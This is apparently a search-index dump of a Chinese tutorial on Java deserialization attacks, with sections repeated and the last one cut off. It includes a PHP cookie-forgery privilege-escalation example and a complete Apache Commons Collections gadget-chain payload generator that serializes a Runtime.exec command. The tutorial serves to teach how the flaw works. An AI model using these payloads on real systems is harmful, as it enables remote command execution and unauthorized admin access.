\u5e8f\u5217\u5316\u5e38\u7528\u4e8e\u5c06\u7a0b\u5e8f\u8fd0\u884c\u65f6\u7684\u5bf9\u8c61\u72b6\u6001\u4ee5\u4e8c\u8fdb\u5236\u7684\u5f62\u5f0f\u5b58\u50a8\u4e8e\u6587\u4ef6\u7cfb\u7edf\u4e2d\uff0c\u7136\u540e\u53ef\u4ee5\u5728\u53e6\u4e00\u4e2a\u7a0b\u5e8f\u4e2d\u5bf9\u5e8f\u5217\u5316\u540e\u7684\u5bf9\u8c61\u72b6\u6001\u6570\u636e\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u6062\u590d\u5bf9\u8c61\u3002\u7b80\u5355\u7684\u8bf4\u5c31\u662f\u53ef\u4ee5\u57fa\u4e8e\u5e8f\u5217\u5316\u6570\u636e\u5b9e\u65f6\u5728\u4e24\u4e2a\u7a0b\u5e8f\u4e2d\u4f20\u9012\u7a0b\u5e8f\u5bf9\u8c61\u3002 \u5728\u7b2c\u4e00\u6bb5\u4ee3\u7801\u91cc\u9762\uff0c\u7a0b\u5e8f\u5c06\u5b9e\u4f8b\u5bf9\u8c61 String(\"This is String object!\") \u901a\u8fc7 ObjectOutputStream \u7c7b\u7684 writeObject() \u51fd\u6570\u5199\u5230\u4e86\u6587\u4ef6\u91cc\u3002\u5e8f\u5217\u5316\u5bf9\u8c61\u5728\u5177\u6709\u4e00\u5b9a\u7684\u4e8c\u8fdb\u5236\u7ed3\u6784\uff0c\u4ee5\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u67e5\u770b\u5b58\u50a8\u4e86\u5e8f\u5217\u5316\u5bf9\u8c61\u7684\u6587\u4ef6\uff0c\u9664\u4e86\u5305\u542b\u4e00\u4e9b\u5b57\u7b26\u4e32\u5e38\u91cf\u4ee5\u5916\uff0c\u8fd8\u80fd\u770b\u5230\u5176\u5177\u6709\u4e0d\u53ef\u6253\u5370\u7684\u5b57\u7b26\u5728\u91cc\u9762\uff0c\u800c\u8fd9\u4e9b\u5b57\u7b26\u5c31\u662f\u7528\u6765\u63cf\u8ff0\u5176\u5e8f\u5217\u5316\u7ed3\u6784\u7684\u3002 Java \u5e8f\u5217\u5316\u7279\u5f81 \u00b6 \u5728\u5e8f\u5217\u5316\u5bf9\u8c61\u6570\u636e\u4e2d\uff0c\u59344\u4e2a\u5b57\u8282\u5b58\u50a8\u7684\u662f Java \u5e8f\u5217\u5316\u5bf9\u8c61\u6570\u636e\u7279\u6709\u7684 Magic Number \u548c\u76f8\u5e94\u7684\u534f\u8bae\u7248\u672c\uff0c\u901a\u5e38\u4e3a\uff1a 1 2 0xaced (Magic Number) 0x0005 (Version Number) \u5728\u5177\u4f53\u5e8f\u5217\u5316\u4e00\u4e2a\u5bf9\u8c61\u65f6\uff0c\u4f1a\u9075\u5faa\u5e8f\u5217\u5316\u534f\u8bae\u8fdb\u884c\u6570\u636e\u5c01\u88c5. \u5217\u5316\u540e\u7684 Java \u5bf9\u8c61\u4e8c\u8fdb\u5236\u6570\u636e\u901a\u5e38\u4ee5 0xaced0005 \u8fd9 4 \u4e2a\u5b57\u8282\u5f00\u59cb\u5c31\u53ef\u4ee5\u4e86\u3002\u5bf9 Java \u5e94\u7528\u5e8f\u5217\u5316\u5bf9\u8c61\u4ea4\u4e92\u7684\u63a5\u53e3\u5bfb\u627e\u5c31\u53ef\u4ee5\u901a\u8fc7\u76d1\u6d4b\u8fd9 4 \u4e2a\u7279\u6b8a\u5b57\u8282\u6765\u8fdb\u884c\u3002 \u5728 Java \u91cc\uff0c\u53ef\u4ee5\u5e8f\u5217\u5316\u4e00\u4e2a\u5bf9\u8c61\u6210\u4e3a\u5177\u6709\u4e00\u5b9a\u6570\u636e\u683c\u5f0f\u7684\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u4e5f\u53ef\u4ee5\u4ece\u6570\u636e\u6d41\u7a0b\u4e2d\u6062\u590d\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u3002\u800c\u8fdb\u884c\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u65f6\u4f1a\u4f7f\u7528\u4e24\u4e2a\u7c7b\uff0c\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 // \u5e8f\u5217\u5316\u5bf9\u8c61 java . io . ObjectOutputStream writeObject () writeUnshared () ... // \u53cd\u5e8f\u5217\u5316\u5bf9\u8c61 java . io . ObjectInputStream readObject () readUnshared () ... \u4e5f\u53ef\u4ee5\u5728\u5bf9\u8c61\u4e2d\u91cd\u5199 writeObject() \u548c readObject() \u51fd\u6570\uff0c\u6765\u8fdb\u884c\u4e00\u4e9b\u7279\u6b8a\u7684\u72b6\u6001\u548c\u6570\u636e\u7684\u63a7\u5236\u3002 \u5982\u679c\u6211\u4eec\u9700\u8981\u5bfb\u627e\u67d0\u4e2a Java \u5e94\u7528\u7684\u5e8f\u5217\u5316\u6570\u636e\u4ea4\u4e92\u63a5\u53e3\u65f6\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5168\u5c40\u4ee3\u7801\u641c\u7d22\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u4e2d\u5e38\u7528\u7684\u90a3\u4e9b\u51fd\u6570\u548c\u65b9\u6cd5\uff0c\u5f53\u627e\u5230 Java \u5e94\u7528\u7684\u5e8f\u5217\u5316\u6570\u636e\u4ea4\u4e92\u63a5\u53e3\u540e\uff0c\u4fbf\u53ef\u4ee5\u5f00\u59cb\u8003\u8651\u5177\u4f53\u7684\u5229\u7528\u65b9\u6cd5\u4e86\u3002 \u53cd\u5e8f\u5217\u5316\u7684\u5371\u5bb3 \u00b6 \u4e0b\u9762\u662f\u4e00\u6bb5\u4ee3\u7801\u662f PHP \u4ee3\u7801\u4e2d\u5c06\u5e8f\u5217\u5316\u6570\u636e\u4ee5 Cookie \u5f62\u5f0f\u5b58\u50a8\u7684\u5b9e\u4f8b\uff08user.php\uff09\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 <?php class User { public $username = '' ; private $is_admin = false ; function __construct ( $username ) { $this -> username = $username ; } function isAdmin () { return $this -> is_admin ; } } function initUser () { $user = new User ( 'Guest' ); $data = base64_encode ( serialize ( $user )); setCookie ( 'user' , $data , time () + 3600 ); echo '<script>location.href=\"./user.php\"</script>' ; } if ( isset ( $_COOKIE [ 'user' ])) { $user = unserialize ( base64_decode ( $_COOKIE [ 'user' ])); if ( $user ) { if ( $user -> isAdmin ()) { echo 'Welcome Come Back, Admninistrator.' ; } else { echo \"Hello, $user->username .\" ; } } else { initUser (); } } else { initUser (); } \u8fd9\u6bb5\u4ee3\u7801\u5c06\u7528\u6237\u4fe1\u606f\u4ee5 base64_encode(serialize($user)) \u7684\u5f62\u5f0f\u5b58\u50a8\u4e8e\u5ba2\u6237\u7aef\u7684 $_COOKIE['data'] \u91cc\uff0c\u5bf9\u5e8f\u5217\u5316\u654f\u611f\u7684\u90fd\u77e5\u9053\u53ef\u4ee5\u81ea\u5df1\u6784\u9020\u5e8f\u5217\u5316\u5185\u5bb9\u7136\u540e\u4f20\u9012\u7ed9\u670d\u52a1\u7aef\uff0c\u4f7f\u5176\u6539\u53d8\u4ee3\u7801\u903b\u8f91\u3002\u4f7f\u7528\u4e0b\u9762\u8fd9\u6bb5\u4ee3\u7801\u751f\u6210 $is_admin = true \u7684\u7528\u6237\u4fe1\u606f\uff1a 1 2 3 4 5 6 7 <?php class User { public $username = 'Guest' ; private $is_admin = true ; } echo base64_encode ( serialize ( new User ())); \u7528\u751f\u6210\u597d\u7684 Payload \u4fee\u6539 Cookie \u540e\u518d\u6b21\u8bbf\u95ee\u5373\u53ef\u770b\u5230 Welcome Come Back, Admninistrator. \u7684\u8f93\u51fa\u4fe1\u606f\u3002 Java \u4e2d\u4e5f\u53ef\u4ee5\u5229\u7528\u53cd\u5e8f\u5217\u5316\u63a7\u5236\u4ee3\u7801\u6d41\u7a0b\uff08\u4f20\u64ad\u7684\u6bd5\u7adf\u662f\u4e00\u4e2a\u5bf9\u8c61\u5b9e\u4f8b\uff09\uff0c \u4f46\u5728 Java \u4e2d\u60f3\u8981\u968f\u4fbf\u53cd\u5e8f\u5217\u5316\u4e00\u4e2a\u7c7b\u5b9e\u4f8b\u662f\u4e0d\u884c\u7684\uff0c\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u7684\u7c7b\u5fc5\u987b\u663e\u793a\u58f0\u660e Serializable \u63a5\u53e3\uff0c\u8fd9\u6837\u624d\u5141\u8bb8\u8fdb\u884c\u5e8f\u5217\u5316\u64cd\u4f5c\u3002 \u9762\u5411\u5c5e\u6027\u7f16\u7a0b \u00b6 \u9762\u5411\u5c5e\u6027\u7f16\u7a0b\uff08Property-Oriented Programing\uff09\u5e38\u7528\u4e8e\u4e0a\u5c42\u8bed\u8a00\u6784\u9020\u7279\u5b9a\u8c03\u7528\u94fe\u7684\u65b9\u6cd5\uff0c\u4e0e\u4e8c\u8fdb\u5236\u5229\u7528\u4e2d\u7684\u9762\u5411\u8fd4\u56de\u7f16\u7a0b\uff08Return-Oriented Programing\uff09\u7684\u539f\u7406\u76f8\u4f3c\uff0c\u90fd\u662f\u4ece\u73b0\u6709\u8fd0\u884c\u73af\u5883\u4e2d\u5bfb\u627e\u4e00\u7cfb\u5217\u7684\u4ee3\u7801\u6216\u8005\u6307\u4ee4\u8c03\u7528\uff0c\u7136\u540e\u6839\u636e\u9700\u6c42\u6784\u6210\u4e00\u7ec4\u8fde\u7eed\u7684\u8c03\u7528\u94fe\u3002\u5728\u63a7\u5236\u4ee3\u7801\u6216\u8005\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u540e\u5c31\u80fd\u591f\u4f7f\u7528\u8fd9\u4e00\u7ec4\u8c03\u7528\u94fe\u505a\u4e00\u4e9b\u5de5\u4f5c\u4e86\u3002 Java \u53cd\u5e8f\u5217\u5316\u5229\u7528 \u00b6 InvokerTransformer.transform() \u53cd\u5c04\u8c03\u7528 \u5728\u4f7f\u7528 Apache Commons Collections \u5e93\u8fdb\u884c Gadget \u6784\u9020\u65f6\u4e3b\u8981\u5229\u7528\u4e86\u5176 Transformer \u63a5\u53e3\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 public interface Transformer { /** * Transforms the input object (leaving it unchanged) into some output object. * * @param input the object to be transformed, should be left unchanged * @return a transformed object * @throws ClassCastException (runtime) if the input is the wrong class * @throws IllegalArgumentException (runtime) if the input is invalid * @throws FunctorException (runtime) if the transform cannot be completed */ public Object transform ( Object input ); } \u4e3b\u8981\u7528\u4e8e\u5c06\u4e00\u4e2a\u5bf9\u8c61\u901a\u8fc7 transform \u65b9\u6cd5\u8f6c\u6362\u4e3a\u53e6\u4e00\u4e2a\u5bf9\u8c61\uff0c\u800c\u5728\u5e93\u4e2d\u4f17\u591a\u5bf9\u8c61\u8f6c\u6362\u7684\u63a5\u53e3\u4e2d\u5b58\u5728\u4e00\u4e2a Invoker \u7c7b\u578b\u7684\u8f6c\u6362\u63a5\u53e3 InvokerTransformer \uff0c\u5e76\u4e14\u540c\u65f6\u8fd8\u5b9e\u73b0\u4e86 Serializable \u63a5\u53e3\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public class InvokerTransformer implements Transformer , Serializable { ... \u7701\u7565 ... private final String iMethodName ; private final Class [] iParamTypes ; private final Object [] iArgs ; public Object transform ( Object input ) { if ( input == null ) { return null ; } try { Class cls = input . getClass (); // \u53cd\u5c04\u83b7\u53d6\u7c7b Method method = cls . getMethod ( iMethodName , iParamTypes ); // \u53cd\u5c04\u5f97\u5230\u5177\u6709\u5bf9\u5e94\u53c2\u6570\u7684\u65b9\u6cd5 return method . invoke ( input , iArgs ); // \u4f7f\u7528\u5bf9\u5e94\u53c2\u6570\u8c03\u7528\u65b9\u6cd5\uff0c\u5e76\u8fd4\u56de\u76f8\u5e94\u8c03\u7528\u7ed3\u679c } catch ( NoSuchMethodException ex ) { ... \u7701\u7565 ... \u53ef\u4ee5\u770b\u5230 InvokerTransformer \u7c7b\u4e2d\u5b9e\u73b0\u7684 transform() \u63a5\u53e3\u4f7f\u7528 Java \u53cd\u5c04\u673a\u5236\u83b7\u53d6\u53cd\u5c04\u5bf9\u8c61 input \u4e2d\u7684\u53c2\u6570\u7c7b\u578b\u4e3a iParamTypes \u7684\u65b9\u6cd5 iMethodName \uff0c\u7136\u540e\u4f7f\u7528\u5bf9\u5e94\u53c2\u6570 iArgs \u8c03\u7528\u83b7\u53d6\u7684\u65b9\u6cd5\uff0c\u5e76\u5c06\u6267\u884c\u7ed3\u679c\u8fd4\u56de\u3002\u7531\u4e8e\u5176\u5b9e\u73b0\u4e86 Serializable \u63a5\u53e3\uff0c\u56e0\u6b64\u5176\u4e2d\u7684\u4e09\u4e2a\u5fc5\u8981\u53c2\u6570 iMethodName \u3001 iParamTypes \u548c iArgs \u90fd\u662f\u53ef\u4ee5\u901a\u8fc7\u5e8f\u5217\u5316\u76f4\u63a5\u6784\u9020\u7684\uff0c\u4e3a\u547d\u4ee4\u6267\u884c\u521b\u9020\u7684\u51b3\u5b9a\u6027\u7684\u6761\u4ef6\u3002 \u7136\u540e\u8981\u60f3\u5229\u7528 InvokerTransformer \u7c7b\u4e2d\u7684 transform() \u6765\u8fbe\u5230\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff0c\u8fd8\u9700\u8981\u4e00\u4e2a\u5165\u53e3\u70b9\uff0c\u4f7f\u5f97\u5e94\u7528\u5728\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\u80fd\u591f\u901a\u8fc7\u4e00\u6761\u8c03\u7528\u94fe\u6765\u89e6\u53d1 InvokerTransformer \u4e2d\u7684 transform() \u63a5\u53e3\u3002 \u7136\u800c\u5728 Apache Commons Collections \u91cc\u786e\u5b9e\u5b58\u5728\u8fd9\u6837\u7684\u8c03\u7528\uff0c\u5176\u4e00\u662f\u4f4d\u4e8e TransformedMap \u7c7b\u4e2d\u7684 checkSetValue() \u65b9\u6cd5\uff1a 1 2 3 4 5 6 7 public class TransformedMap extends AbstractInputCheckedMapDecorator implements Serializable { ... \u7701\u7565 ... protected Object checkSetValue ( Object value ) { return valueTransformer . transform ( value ); } \u800c TransformedMap \u5b9e\u73b0\u4e86 Map \u63a5\u53e3\uff0c\u800c\u5728\u5bf9\u5b57\u5178\u952e\u503c\u8fdb\u884c setValue() \u64cd\u4f5c\u65f6\u4f1a\u8c03\u7528 valueTransformer.transform(value) \u3002 1 2 3 4 5 6 ... \u7701\u7565 ... public Object setValue ( Object value ) { value = parent . checkSetValue ( value ); return entry . setValue ( value ); } } \u597d\u7684\uff0c\u73b0\u5728\u5df2\u7ecf\u627e\u5230\u4e86\u53cd\u5c04\u8c03\u7528\u7684\u4e0a\u4e00\u6b65\u8c03\u7528\uff0c\u8fd9\u91cc\u4e3a\u4e86\u591a\u6b21\u8fdb\u884c\u591a\u6b21\u53cd\u5c04\u8c03\u7528\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u591a\u4e2a InvokerTransformer \u5b9e\u4f8b\u7ea7\u8054\u5728\u4e00\u8d77\u7ec4\u6210\u4e00\u4e2a ChainedTransformer \u5bf9\u8c61\uff0c\u5728\u5176\u8c03\u7528\u7684\u65f6\u5019\u4f1a\u8fdb\u884c\u4e00\u4e2a\u7ea7\u8054 transform() \u8c03\u7528\uff1a 1 2 3 4 5 6 7 8 public class ChainedTransformer implements Transformer, Serializable { ...\u7701\u7565... public Object transform(Object object) { for (int i = 0; i < iTransformers.length; i++) { object = iTransformers[i].transform(object); } return object; } \u73b0\u5728\u5df2\u7ecf\u53ef\u4ee5\u9020\u51fa\u4e00\u4e2a TransformedMap \u5b9e\u4f8b\uff0c\u5728\u5bf9\u5b57\u5178\u952e\u503c\u8fdb\u884c setValue() \u64cd\u4f5c\u65f6\u5019\u8c03\u6211\u4eec\u6784\u9020\u7684 ChainedTransformer \uff0c\u4e0b\u9762\u7ed9\u51fa\u793a\u4f8b\u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package exserial.examples ; import org.apache.commons.collections.Transformer ; import org.apache.commons.collections.functors.ChainedTransformer ; import org.apache.commons.collections.functors.ConstantTransformer ; import org.apache.commons.collections.functors.InvokerTransformer ; import org.apache.commons.collections.map.TransformedMap ; import java.util.HashMap ; import java.util.Map ; public class SetValueToExec { public static void main ( String [] args ) throws Exception { String command = ( args . length != 0 ) ? args [ 0 ] : \"/bin/sh,-c,open /Applications/Calculator.app\" ; String [] execArgs = command . split ( \",\" ); Transformer [] transforms = new Transformer [] { new ConstantTransformer ( Runtime . class ), new InvokerTransformer ( \"getMethod\" , new Class [] { String . class , Class []. class }, new Object [] { \"getRuntime\" , new Class [ 0 ]} ), new InvokerTransformer ( \"invoke\" , new Class [] { Object . class , Object []. class }, new Object [] { null , new Object [ 0 ]} ), new InvokerTransformer ( \"exec\" , new Class [] { String []. class }, new Object [] { execArgs } ) }; Transformer transformerChain = new ChainedTransformer ( transforms ); Map tempMap = new HashMap < String , Object >(); Map < String , Object > exMap = TransformedMap . decorate ( tempMap , null , transformerChain ); exMap . put ( \"1111\" , \"2222\" ); for ( Map . Entry < String , Object > exMapValue : exMap . entrySet ()) { exMapValue . setValue ( 1 ); } } } \u6839\u636e\u4e4b\u524d\u7684\u5206\u6790\uff0c\u5c06\u4e0a\u9762\u8fd9\u6bb5\u4ee3\u7801\u7f16\u8bd1\u8fd0\u884c\u540e\u4f1a\u9ed8\u8ba4\u4f1a\u5f39\u51fa\u8ba1\u7b97\u5668\uff0c\u5bf9\u4ee3\u7801\u8be6\u7ec6\u6267\u884c\u8fc7\u7a0b\u6709\u7591\u60d1\u7684\u53ef\u4ee5\u901a\u8fc7\u5355\u6b65\u8c03\u8bd5\u8fdb\u884c\u6d4b\u8bd5\uff1a \u7136\u540e\u6211\u4eec\u73b0\u5728\u53ea\u662f\u6d4b\u8bd5\u4e86\u4f7f\u7528 TransformedMap \u8fdb\u884c\u4efb\u610f\u547d\u4ee4\u6267\u884c\u800c\u5df2\uff0c\u8981\u60f3\u5728 Java \u5e94\u7528\u53cd\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\u4e2d\u89e6\u53d1\u8be5\u8fc7\u7a0b\u8fd8\u9700\u8981\u627e\u5230\u4e00\u4e2a\u7c7b\uff0c\u5b83\u80fd\u591f\u5728\u53cd\u5e8f\u5217\u5316\u8c03\u7528 readObject() \u7684\u65f6\u5019\u8c03\u7528 TransformedMap \u5185\u7f6e\u7c7b MapEntry \u4e2d\u7684 setValue() \u51fd\u6570\uff0c\u8fd9\u6837\u624d\u80fd\u6784\u6210\u4e00\u6761\u5b8c\u6574\u7684 Gadget \u8c03\u7528\u94fe\u3002\u6070\u597d\u5728 sun.reflect.annotation.AnnotationInvocationHandler \u7c7b\u5177\u6709 Map \u7c7b\u578b\u7684\u53c2\u6570\uff0c\u5e76\u4e14\u5728 readObject() \u65b9\u6cd5\u4e2d\u89e6\u53d1\u4e86\u4e0a\u9762\u6240\u63d0\u5230\u7684\u6240\u6709\u6761\u4ef6\uff0c\u5176\u6e90\u7801\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 private void readObject(java.io.ObjectInputStream s) { ...\u7701\u7565... for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) { String name = memberValue.getKey(); Class<?> memberType = memberTypes.get(name); if (memberType != null) { // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { memberValue.setValue(new AnnotationTypeMismatchExceptionProxy(value.getClass() + \"[\" + value + \"]\").setMember(annotationType.members().get(name))); } } } } \u53ef\u4ee5\u6ce8\u610f\u5230 memberValue \u662f AnnotationInvocationHandler \u7c7b\u4e2d\u7c7b\u578b\u58f0\u660e\u4e3a Map<String, Object> \u7684\u6210\u5458\u53d8\u91cf\uff0c\u521a\u597d\u548c\u4e4b\u524d\u6784\u9020\u7684 TransformedMap \u7c7b\u578b\u76f8\u7b26\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 Java \u7684\u53cd\u5c04\u673a\u5236\u52a8\u6001\u7684\u83b7\u53d6 AnnotationInvocationHandler \u7c7b\uff0c\u4f7f\u7528\u7cbe\u5fc3\u6784\u9020\u597d\u7684 TransformedMap \u4f5c\u4e3a\u5b83\u7684\u5b9e\u4f8b\u5316\u53c2\u6570\uff0c\u7136\u540e\u5c06\u5b9e\u4f8b\u5316\u7684 AnnotationInvocationHandler \u8fdb\u884c\u5e8f\u5217\u5316\u5f97\u5230\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u6700\u540e\u4f20\u9012\u7ed9\u5177\u6709\u76f8\u5e94\u73af\u5883\u7684\u5e8f\u5217\u5316\u6570\u636e\u4ea4\u4e92\u63a5\u53e3\u4f7f\u4e4b\u89e6\u53d1\u547d\u4ee4\u6267\u884c\u7684 Gadget\uff0c\u5b8c\u6574\u4ee3\u7801\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package exserial.payloads; import java.io.ObjectOutputStream; import java.util.Map; import java.util.HashMap; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.TransformedMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import exserial.payloads.utils.Serializables; public class Commons1 { public static Object getAnnotationInvocationHandler(String command) throws Exception { String[] execArgs = command.split(\",\"); Transformer[] transforms = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer( \"getMethod\", new Class[] {String.class, Class[].class}, new Object[] {\"getRuntime\", new Class[0]} ), new InvokerTransformer( \"invoke\", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]} ), new InvokerTransformer( \"exec\", new Class[] {String[].class}, new Object[] {execArgs} ) }; Transformer transformerChain = new ChainedTransformer(transforms); Map tempMap = new HashMap(); tempMap.put(\"value\", \"does't matter\"); Map exMap = TransformedMap.decorate(tempMap, null, transformerChain); Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object instance = ctor.newInstance(Target.class, exMap); return instance; } public static void main(String[] args) throws Exception { String command = (args.length != 0) ? args[0] : \"/bin/sh,-c,open /Applications/Calculator.app\"; Object obj = getAnnotationInvocationHandler(command); ObjectOutputStream out = new ObjectOutputStream(System.out); out.writeObject(obj); } } \u6700\u7ec8\u7528\u4e00\u6bb5\u8c03\u7528\u94fe\u53ef\u4ee5\u6e05\u6670\u7684\u63cf\u8ff0\u6574\u4e2a\u547d\u4ee4\u6267\u884c\u7684\u89e6\u53d1\u8fc7\u7a0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /* Gadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() AbstractInputCheckedMapDecorator$MapEntry.setValue() TransformedMap.checkSetValue() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() Requires: commons-collections <= 3.2.1 */ \u53c2\u8003 \u00b6 \u4e4c\u4e91","title":"\u4ece\u53cd\u5e8f\u5217\u5316\u5230\u547d\u4ee4\u6267\u884c - Java \u4e2d\u7684 POP \u6267\u884c\u94fe"},{"location":"audit/java/#-java-pop","text":"\u5e8f\u5217\u5316\u5e38\u7528\u4e8e\u5c06\u7a0b\u5e8f\u8fd0\u884c\u65f6\u7684\u5bf9\u8c61\u72b6\u6001\u4ee5\u4e8c\u8fdb\u5236\u7684\u5f62\u5f0f\u5b58\u50a8\u4e8e\u6587\u4ef6\u7cfb\u7edf\u4e2d\uff0c\u7136\u540e\u53ef\u4ee5\u5728\u53e6\u4e00\u4e2a\u7a0b\u5e8f\u4e2d\u5bf9\u5e8f\u5217\u5316\u540e\u7684\u5bf9\u8c61\u72b6\u6001\u6570\u636e\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u6062\u590d\u5bf9\u8c61\u3002\u7b80\u5355\u7684\u8bf4\u5c31\u662f\u53ef\u4ee5\u57fa\u4e8e\u5e8f\u5217\u5316\u6570\u636e\u5b9e\u65f6\u5728\u4e24\u4e2a\u7a0b\u5e8f\u4e2d\u4f20\u9012\u7a0b\u5e8f\u5bf9\u8c61\u3002 \u5728\u7b2c\u4e00\u6bb5\u4ee3\u7801\u91cc\u9762\uff0c\u7a0b\u5e8f\u5c06\u5b9e\u4f8b\u5bf9\u8c61 String(\"This is String object!\") \u901a\u8fc7 ObjectOutputStream \u7c7b\u7684 writeObject() \u51fd\u6570\u5199\u5230\u4e86\u6587\u4ef6\u91cc\u3002\u5e8f\u5217\u5316\u5bf9\u8c61\u5728\u5177\u6709\u4e00\u5b9a\u7684\u4e8c\u8fdb\u5236\u7ed3\u6784\uff0c\u4ee5\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u67e5\u770b\u5b58\u50a8\u4e86\u5e8f\u5217\u5316\u5bf9\u8c61\u7684\u6587\u4ef6\uff0c\u9664\u4e86\u5305\u542b\u4e00\u4e9b\u5b57\u7b26\u4e32\u5e38\u91cf\u4ee5\u5916\uff0c\u8fd8\u80fd\u770b\u5230\u5176\u5177\u6709\u4e0d\u53ef\u6253\u5370\u7684\u5b57\u7b26\u5728\u91cc\u9762\uff0c\u800c\u8fd9\u4e9b\u5b57\u7b26\u5c31\u662f\u7528\u6765\u63cf\u8ff0\u5176\u5e8f\u5217\u5316\u7ed3\u6784\u7684\u3002","title":"\u4ece\u53cd\u5e8f\u5217\u5316\u5230\u547d\u4ee4\u6267\u884c - Java \u4e2d\u7684 POP \u6267\u884c\u94fe"},{"location":"audit/java/#java","text":"\u5728\u5e8f\u5217\u5316\u5bf9\u8c61\u6570\u636e\u4e2d\uff0c\u59344\u4e2a\u5b57\u8282\u5b58\u50a8\u7684\u662f Java \u5e8f\u5217\u5316\u5bf9\u8c61\u6570\u636e\u7279\u6709\u7684 Magic Number \u548c\u76f8\u5e94\u7684\u534f\u8bae\u7248\u672c\uff0c\u901a\u5e38\u4e3a\uff1a 1 2 0xaced (Magic Number) 0x0005 (Version Number) \u5728\u5177\u4f53\u5e8f\u5217\u5316\u4e00\u4e2a\u5bf9\u8c61\u65f6\uff0c\u4f1a\u9075\u5faa\u5e8f\u5217\u5316\u534f\u8bae\u8fdb\u884c\u6570\u636e\u5c01\u88c5. \u5217\u5316\u540e\u7684 Java \u5bf9\u8c61\u4e8c\u8fdb\u5236\u6570\u636e\u901a\u5e38\u4ee5 0xaced0005 \u8fd9 4 \u4e2a\u5b57\u8282\u5f00\u59cb\u5c31\u53ef\u4ee5\u4e86\u3002\u5bf9 Java \u5e94\u7528\u5e8f\u5217\u5316\u5bf9\u8c61\u4ea4\u4e92\u7684\u63a5\u53e3\u5bfb\u627e\u5c31\u53ef\u4ee5\u901a\u8fc7\u76d1\u6d4b\u8fd9 4 \u4e2a\u7279\u6b8a\u5b57\u8282\u6765\u8fdb\u884c\u3002 \u5728 Java \u91cc\uff0c\u53ef\u4ee5\u5e8f\u5217\u5316\u4e00\u4e2a\u5bf9\u8c61\u6210\u4e3a\u5177\u6709\u4e00\u5b9a\u6570\u636e\u683c\u5f0f\u7684\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u4e5f\u53ef\u4ee5\u4ece\u6570\u636e\u6d41\u7a0b\u4e2d\u6062\u590d\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u3002\u800c\u8fdb\u884c\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u65f6\u4f1a\u4f7f\u7528\u4e24\u4e2a\u7c7b\uff0c\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 // \u5e8f\u5217\u5316\u5bf9\u8c61 java . io . ObjectOutputStream writeObject () writeUnshared () ... // \u53cd\u5e8f\u5217\u5316\u5bf9\u8c61 java . io . ObjectInputStream readObject () readUnshared () ... \u4e5f\u53ef\u4ee5\u5728\u5bf9\u8c61\u4e2d\u91cd\u5199 writeObject() \u548c readObject() \u51fd\u6570\uff0c\u6765\u8fdb\u884c\u4e00\u4e9b\u7279\u6b8a\u7684\u72b6\u6001\u548c\u6570\u636e\u7684\u63a7\u5236\u3002 \u5982\u679c\u6211\u4eec\u9700\u8981\u5bfb\u627e\u67d0\u4e2a Java \u5e94\u7528\u7684\u5e8f\u5217\u5316\u6570\u636e\u4ea4\u4e92\u63a5\u53e3\u65f6\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5168\u5c40\u4ee3\u7801\u641c\u7d22\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u4e2d\u5e38\u7528\u7684\u90a3\u4e9b\u51fd\u6570\u548c\u65b9\u6cd5\uff0c\u5f53\u627e\u5230 Java 